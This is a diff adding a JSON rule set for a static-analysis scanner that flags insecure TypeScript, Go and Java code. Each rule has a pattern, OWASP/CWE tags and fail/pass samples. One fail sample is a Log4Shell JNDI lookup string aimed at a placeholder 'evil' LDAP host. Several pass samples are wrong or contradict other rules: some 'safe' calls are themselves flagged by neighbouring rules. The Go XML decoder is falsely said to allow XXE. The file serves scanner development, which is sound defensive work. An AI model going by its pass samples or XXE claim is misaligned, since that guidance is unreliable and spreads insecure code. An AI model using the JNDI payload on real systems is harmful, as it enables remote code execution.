@@ -1,0 +1,556 @@
+[
+ {
+  "id": "ts-exec-sync",
+  "group": "tsx1",
+  "languages": [
+   "typescript"
+  ],
+  "severity": "ERROR",
+  "category": "security:code-execution",
+  "message": "execSync runs a shell command string",
+  "fix": "Use execFileSync with a fixed program",
+  "pattern": "execSync($CMD)",
+  "metadata": {
+   "owasp": "A03:2021-Injection",
+   "cwe": "CWE-78",
+   "confidence": "HIGH"
+  },
+  "fail": "child_process.execSync(cmd)",
+  "pass": "child_process.execFileSync(\"ls\", [])"
+ },
+ {
+  "id": "ts-exec-file-sync",
+  "group": "tsx1",
+  "languages": [
+   "typescript"
+  ],
+  "severity": "ERROR",
+  "category": "security:code-execution",
+  "message": "execFileSync runs a program whose path may be user-controlled",
+  "fix": "Use a fixed executable path",
+  "pattern": "execFileSync($FILE)",
+  "metadata": {
+   "owasp": "A03:2021-Injection",
+   "cwe": "CWE-78",
+   "confidence": "HIGH"
+  },
+  "fail": "child_process.execFileSync(userPath)",
+  "pass": "child_process.execSync(\"ls\")"
+ },
+ {
+  "id": "ts-spawn-sync",
+  "group": "tsx1",
+  "languages": [
+   "typescript"
+  ],
+  "severity": "WARNING",
+  "category": "security:code-execution",
+  "message": "spawnSync invoked with a user-controlled command",
+  "fix": "Use a fixed command and argument array",
+  "pattern": "spawnSync($CMD)",
+  "metadata": {
+   "owasp": "A03:2021-Injection",
+   "cwe": "CWE-78",
+   "confidence": "MEDIUM"
+  },
+  "fail": "child_process.spawnSync(userCmd)",
+  "pass": "child_process.spawn(\"ls\", [])"
+ },
+ {
+  "id": "ts-document-write",
+  "group": "tsx1",
+  "languages": [
+   "typescript"
+  ],
+  "severity": "WARNING",
+  "category": "security:owasp-a3-xss",
+  "message": "document.write with untrusted input (XSS)",
+  "fix": "Use textContent or sanitize before inserting",
+  "pattern": "document.write($HTML)",
+  "mvr": {
+   "$HTML": "^[A-Za-z_][A-Za-z0-9_]*$"
+  },
+  "metadata": {
+   "owasp": "A03:2021-Injection",
+   "cwe": "CWE-79",
+   "confidence": "MEDIUM"
+  },
+  "fail": "document.write(userHtml)",
+  "pass": "element.textContent = \"ok\""
+ },
+ {
+  "id": "ts-location-assign",
+  "group": "tsx1",
+  "languages": [
+   "typescript"
+  ],
+  "severity": "WARNING",
+  "category": "security:open-redirect",
+  "message": "location.assign redirects to a user-controlled URL",
+  "fix": "Allowlist redirect targets",
+  "pattern": "location.assign($URL)",
+  "metadata": {
+   "owasp": "A01:2021-Broken-Access-Control",
+   "cwe": "CWE-601",
+   "confidence": "MEDIUM"
+  },
+  "fail": "location.assign(userUrl)",
+  "pass": "history.back()"
+ },
+ {
+  "id": "ts-location-href",
+  "group": "tsx1",
+  "languages": [
+   "typescript"
+  ],
+  "severity": "WARNING",
+  "category": "security:open-redirect",
+  "message": "location.href set to a user-controlled URL",
+  "fix": "Validate the destination before navigating",
+  "pattern": "location.href = $URL",
+  "metadata": {
+   "owasp": "A01:2021-Broken-Access-Control",
+   "cwe": "CWE-601",
+   "confidence": "MEDIUM"
+  },
+  "fail": "location.href = userUrl",
+  "pass": "window.open(\"/home\")"
+ },
+ {
+  "id": "ts-vm-run-context",
+  "group": "tsx1",
+  "languages": [
+   "typescript"
+  ],
+  "severity": "ERROR",
+  "category": "security:code-execution",
+  "message": "vm.runInNewContext executes untrusted code",
+  "fix": "Do not evaluate untrusted code in the VM",
+  "pattern": "vm.runInNewContext($CODE)",
+  "metadata": {
+   "owasp": "A03:2021-Injection",
+   "cwe": "CWE-94",
+   "confidence": "HIGH"
+  },
+  "fail": "vm.runInNewContext(userCode)",
+  "pass": "const result = JSON.parse(text)"
+ },
+ {
+  "id": "ts-reject-unauthorized-false",
+  "group": "tsx1",
+  "languages": [
+   "typescript"
+  ],
+  "severity": "WARNING",
+  "category": "security:owasp-a2-crypto",
+  "message": "TLS certificate verification disabled",
+  "fix": "Keep rejectUnauthorized enabled",
+  "pattern": "rejectUnauthorized: false",
+  "metadata": {
+   "owasp": "A02:2021-Crypto-Failures",
+   "cwe": "CWE-295",
+   "confidence": "HIGH"
+  },
+  "fail": "const o = {rejectUnauthorized: false}",
+  "pass": "const o = {rejectUnauthorized: true}"
+ },
+ {
+  "id": "ts-cookie-secure-false",
+  "group": "tsx1",
+  "languages": [
+   "typescript"
+  ],
+  "severity": "WARNING",
+  "category": "security:misconfig",
+  "message": "Cookie created without the Secure flag",
+  "fix": "Set secure: true for cookies",
+  "pattern": "secure: false",
+  "metadata": {
+   "owasp": "A02:2021-Crypto-Failures",
+   "cwe": "CWE-614",
+   "confidence": "MEDIUM"
+  },
+  "fail": "res.cookie(\"sid\", v, {secure: false})",
+  "pass": "res.cookie(\"sid\", v, {secure: true})"
+ },
+ {
+  "id": "ts-sha1-hash",
+  "group": "tsx1",
+  "languages": [
+   "typescript"
+  ],
+  "severity": "WARNING",
+  "category": "security:weak-crypto",
+  "message": "SHA-1 hash requested",
+  "fix": "Use SHA-256 or stronger",
+  "pattern": "createHash(\"sha1\")",
+  "metadata": {
+   "owasp": "A02:2021-Crypto-Failures",
+   "cwe": "CWE-327",
+   "confidence": "MEDIUM"
+  },
+  "fail": "crypto.createHash(\"sha1\")",
+  "pass": "crypto.createHash(\"sha256\")"
+ },
+ {
+  "id": "ts-pseudo-random",
+  "group": "tsx1",
+  "languages": [
+   "typescript"
+  ],
+  "severity": "WARNING",
+  "category": "security:weak-crypto",
+  "message": "pseudoRandomBytes is not cryptographically secure",
+  "fix": "Use crypto.randomBytes",
+  "pattern": "pseudoRandomBytes($N)",
+  "metadata": {
+   "owasp": "A02:2021-Crypto-Failures",
+   "cwe": "CWE-338",
+   "confidence": "HIGH"
+  },
+  "fail": "const b = crypto.pseudoRandomBytes(16)",
+  "pass": "const b = crypto.randomBytes(16)"
+ },
+ {
+  "id": "ts-function-ctor",
+  "group": "tsx1",
+  "languages": [
+   "typescript"
+  ],
+  "severity": "ERROR",
+  "category": "security:code-execution",
+  "message": "Function constructor evaluates a string as code",
+  "fix": "Avoid constructing functions from strings",
+  "pattern": "Function($CODE)",
+  "metadata": {
+   "owasp": "A03:2021-Injection",
+   "cwe": "CWE-95",
+   "confidence": "HIGH"
+  },
+  "fail": "const f = Function(userCode)",
+  "pass": "const f = () => 1"
+ },
+ {
+  "id": "go-text-template",
+  "group": "gox1",
+  "languages": [
+   "go"
+  ],
+  "severity": "WARNING",
+  "category": "security:owasp-a3-xss",
+  "message": "text/template does not HTML-escape output (XSS)",
+  "fix": "Use html/template for untrusted data",
+  "pattern": "\"text/template\"",
+  "metadata": {
+   "owasp": "A03:2021-Injection",
+   "cwe": "CWE-79",
+   "confidence": "MEDIUM"
+  },
+  "fail": "import \"text/template\"",
+  "pass": "import \"html/template\""
+ },
+ {
+  "id": "go-sha1-new",
+  "group": "gox1",
+  "languages": [
+   "go"
+  ],
+  "severity": "WARNING",
+  "category": "security:weak-crypto",
+  "message": "SHA-1 hash constructed",
+  "fix": "Use sha256 or stronger",
+  "pattern": "sha1.New()",
+  "metadata": {
+   "owasp": "A02:2021-Crypto-Failures",
+   "cwe": "CWE-327",
+   "confidence": "MEDIUM"
+  },
+  "fail": "h := sha1.New()",
+  "pass": "h := sha256.New()"
+ },
+ {
+  "id": "go-des-cipher",
+  "group": "gox1",
+  "languages": [
+   "go"
+  ],
+  "severity": "ERROR",
+  "category": "security:weak-crypto",
+  "message": "Weak DES cipher constructed",
+  "fix": "Use AES-GCM for encryption",
+  "pattern": "des.NewCipher($KEY)",
+  "metadata": {
+   "owasp": "A02:2021-Crypto-Failures",
+   "cwe": "CWE-327",
+   "confidence": "HIGH"
+  },
+  "fail": "c, _ := des.NewCipher(key)",
+  "pass": "c, _ := aes.NewCipher(key)"
+ },
+ {
+  "id": "go-rc4-cipher",
+  "group": "gox1",
+  "languages": [
+   "go"
+  ],
+  "severity": "ERROR",
+  "category": "security:weak-crypto",
+  "message": "RC4 cipher constructed (broken)",
+  "fix": "Use AES-GCM instead",
+  "pattern": "rc4.NewCipher($KEY)",
+  "metadata": {
+   "owasp": "A02:2021-Crypto-Failures",
+   "cwe": "CWE-327",
+   "confidence": "HIGH"
+  },
+  "fail": "c, _ := rc4.NewCipher(key)",
+  "pass": "c, _ := aes.NewCipher(key)"
+ },
+ {
+  "id": "go-xml-new-decoder",
+  "group": "gox1",
+  "languages": [
+   "go"
+  ],
+  "severity": "WARNING",
+  "category": "security:xxe",
+  "message": "XML decoder may process external entities (XXE)",
+  "fix": "Disable DTDs / external entities in the decoder",
+  "pattern": "xml.NewDecoder($R)",
+  "metadata": {
+   "owasp": "A05:2021-Misconfiguration",
+   "cwe": "CWE-611",
+   "confidence": "MEDIUM"
+  },
+  "fail": "d := xml.NewDecoder(r)",
+  "pass": "d := json.NewDecoder(r)"
+ },
+ {
+  "id": "go-ioutil-readfile",
+  "group": "gox1",
+  "languages": [
+   "go"
+  ],
+  "severity": "WARNING",
+  "category": "security:path-traversal",
+  "message": "ioutil.ReadFile with a possibly user-controlled path",
+  "fix": "Clean and validate the path against a base directory",
+  "pattern": "ioutil.ReadFile($P)",
+  "metadata": {
+   "owasp": "A01:2021-Broken-Access-Control",
+   "cwe": "CWE-22",
+   "confidence": "MEDIUM"
+  },
+  "fail": "data, _ := ioutil.ReadFile(userPath)",
+  "pass": "data, _ := os.ReadFile(\"config.json\")"
+ },
+ {
+  "id": "go-fmt-sprintf-sql",
+  "group": "gox1",
+  "languages": [
+   "go"
+  ],
+  "severity": "ERROR",
+  "category": "security:sqli",
+  "message": "fmt.Sprintf builds a SQL query (injection)",
+  "fix": "Use parameterized queries with placeholders",
+  "pattern": "fmt.Sprintf($FMT, ...)",
+  "fail": "q := fmt.Sprintf(\"SELECT * FROM u WHERE id = %s\", id)",
+  "pass": "row := db.QueryRow(\"SELECT * FROM u WHERE id = ?\", id)",
+  "metadata": {
+   "owasp": "A03:2021-Injection",
+   "cwe": "CWE-89",
+   "confidence": "HIGH"
+  }
+ },
+ {
+  "id": "go-http-listen-tls-off",
+  "group": "gox1",
+  "languages": [
+   "go"
+  ],
+  "severity": "WARNING",
+  "category": "security:misconfig",
+  "message": "Plain HTTP server (no TLS)",
+  "fix": "Serve over TLS or terminate TLS upstream",
+  "pattern": "http.ListenAndServe($ADDR, ...)",
+  "fail": "http.ListenAndServe(addr, handler)",
+  "pass": "http.ListenAndServeTLS(addr, cert, key, handler)",
+  "metadata": {
+   "owasp": "A02:2021-Crypto-Failures",
+   "cwe": "CWE-319",
+   "confidence": "LOW"
+  }
+ },
+ {
+  "id": "java-log4j-jndi",
+  "group": "jvx1",
+  "languages": [
+   "java"
+  ],
+  "severity": "ERROR",
+  "category": "security:rce-log4shell",
+  "message": "Log4j JNDI lookup pattern (Log4Shell)",
+  "fix": "Upgrade Log4j and remove message lookups",
+  "pattern": "${jndi:",
+  "metadata": {
+   "owasp": "A03:2021-Injection",
+   "cwe": "CWE-502",
+   "confidence": "HIGH"
+  },
+  "fail": "log.info(\"User: ${jndi:ldap://evil/a}\")",
+  "pass": "log.info(\"User: {}\", user)"
+ },
+ {
+  "id": "java-xxe-document-builder",
+  "group": "jvx1",
+  "languages": [
+   "java"
+  ],
+  "severity": "WARNING",
+  "category": "security:xxe",
+  "message": "DocumentBuilderFactory default config may allow XXE",
+  "fix": "Set FEATURE_SECURE_PROCESSING and disallow doctypes",
+  "pattern": "DocumentBuilderFactory.newInstance()",
+  "metadata": {
+   "owasp": "A05:2021-Misconfiguration",
+   "cwe": "CWE-611",
+   "confidence": "MEDIUM"
+  },
+  "fail": "DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance()",
+  "pass": "SAXParserFactory spf = SAXParserFactory.newInstance()"
+ },
+ {
+  "id": "java-xxe-sax-factory",
+  "group": "jvx1",
+  "languages": [
+   "java"
+  ],
+  "severity": "WARNING",
+  "category": "security:xxe",
+  "message": "SAXParserFactory default config may allow XXE",
+  "fix": "Enable secure processing on the factory",
+  "pattern": "SAXParserFactory.newInstance()",
+  "metadata": {
+   "owasp": "A05:2021-Misconfiguration",
+   "cwe": "CWE-611",
+   "confidence": "MEDIUM"
+  },
+  "fail": "SAXParserFactory spf = SAXParserFactory.newInstance()",
+  "pass": "TransformerFactory tf = TransformerFactory.newInstance()"
+ },
+ {
+  "id": "java-xxe-xml-input-factory",
+  "group": "jvx1",
+  "languages": [
+   "java"
+  ],
+  "severity": "WARNING",
+  "category": "security:xxe",
+  "message": "XMLInputFactory may allow external entities (XXE)",
+  "fix": "Disable DTD support on the factory",
+  "pattern": "XMLInputFactory.newInstance()",
+  "metadata": {
+   "owasp": "A05:2021-Misconfiguration",
+   "cwe": "CWE-611",
+   "confidence": "MEDIUM"
+  },
+  "fail": "XMLInputFactory xif = XMLInputFactory.newInstance()",
+  "pass": "SAXParserFactory spf = SAXParserFactory.newInstance()"
+ },
+ {
+  "id": "java-deser-xstream",
+  "group": "jvx1",
+  "languages": [
+   "java"
+  ],
+  "severity": "ERROR",
+  "category": "security:deserialization",
+  "message": "XStream fromXML deserializes untrusted data",
+  "fix": "Use a type allowlist or JSON with explicit types",
+  "pattern": "fromXML($XML)",
+  "metadata": {
+   "owasp": "A08:2021-Integrity-Failure",
+   "cwe": "CWE-502",
+   "confidence": "HIGH"
+  },
+  "fail": "Object o = xs.fromXML(userInput)",
+  "pass": "Object o = xs.fromJSON(userInput)"
+ },
+ {
+  "id": "java-deser-fastjson",
+  "group": "jvx1",
+  "languages": [
+   "java"
+  ],
+  "severity": "ERROR",
+  "category": "security:deserialization",
+  "message": "Fastjson JSON.parse may trigger gadget deserialization",
+  "fix": "Disable autotype / use a safe parser",
+  "pattern": "JSON.parse($JSON)",
+  "metadata": {
+   "owasp": "A08:2021-Integrity-Failure",
+   "cwe": "CWE-502",
+   "confidence": "HIGH"
+  },
+  "fail": "Object o = JSON.parse(userJson)",
+  "pass": "Object o = gson.fromJson(userJson, Type.class)"
+ },
+ {
+  "id": "java-weak-random",
+  "group": "jvx1",
+  "languages": [
+   "java"
+  ],
+  "severity": "WARNING",
+  "category": "security:weak-crypto",
+  "message": "java.util.Random is predictable for security values",
+  "fix": "Use SecureRandom for tokens and nonces",
+  "pattern": "new Random($SEED)",
+  "metadata": {
+   "owasp": "A02:2021-Crypto-Failures",
+   "cwe": "CWE-338",
+   "confidence": "MEDIUM"
+  },
+  "fail": "Random r = new Random(seed)",
+  "pass": "SecureRandom r = new SecureRandom()"
+ },
+ {
+  "id": "java-csrf-ignored-annotation",
+  "group": "jvx1",
+  "languages": [
+   "java"
+  ],
+  "severity": "WARNING",
+  "category": "security:csrf",
+  "message": "Endpoint bypasses CSRF protection",
+  "fix": "Keep CSRF protection enabled for state-changing routes",
+  "pattern": "@IgnoreCSRF",
+  "metadata": {
+   "owasp": "A01:2021-Broken-Access-Control",
+   "cwe": "CWE-352",
+   "confidence": "MEDIUM"
+  },
+  "fail": "@IgnoreCSRF\n@GetMapping(\"/x\")",
+  "pass": "@GetMapping(\"/x\")"
+ },
+ {
+  "id": "java-jdbc-autocommit-sqli",
+  "group": "jvx1",
+  "languages": [
+   "java"
+  ],
+  "severity": "ERROR",
+  "category": "security:sqli",
+  "message": "Statement built by string concatenation (SQL injection)",
+  "fix": "Use parameterized queries via PreparedStatement",
+  "pattern": "+ $SQL +",
+  "metadata": {
+   "owasp": "A03:2021-Injection",
+   "cwe": "CWE-89",
+   "confidence": "MEDIUM"
+  },
+  "fail": "String q = \"SELECT * FROM t WHERE id=\" + id + \" AND active=1\";",
+  "pass": "String q = \"SELECT * FROM t WHERE id=?\";"
+ }
+]
